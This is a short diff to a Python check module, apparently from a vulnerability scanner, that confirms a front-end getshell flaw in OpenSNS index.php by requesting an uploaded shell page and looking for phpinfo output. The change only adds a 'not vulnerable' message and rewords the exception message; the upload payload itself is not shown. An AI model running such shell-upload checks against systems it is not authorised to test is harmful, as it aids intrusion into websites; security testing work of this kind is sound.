@@ -32,9 +32,11 @@ class opensns_index_getshell_BaseVerify:
             req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req2.text:
                 cprint("[+]存在opensns index.php 前台getshell漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshell地址: "+shellurl, "red")
+            else:
+                cprint("[-]不存在opensns_index_getshell漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
